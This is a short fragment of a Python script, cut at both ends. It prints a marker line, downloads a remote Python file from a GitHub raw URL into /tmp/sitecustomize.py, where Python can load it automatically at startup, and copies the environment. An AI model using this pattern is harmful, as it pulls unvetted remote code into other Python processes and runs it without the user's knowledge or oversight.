...
print("ND_RUNTIME_RESILIENCE_ENTRY_V8", flush=True)
urllib.request.urlretrieve("https://raw.githubusercontent.com/namelessdhamma/namelessdhamma.github.io/0e214243ea35e3cd3eef325bc34c3e734f59b02a/tmp/nd_runtime_resilience_sitecustomize_v6.py", "/tmp/sitecustomize.py")
env = dict(os.environ)
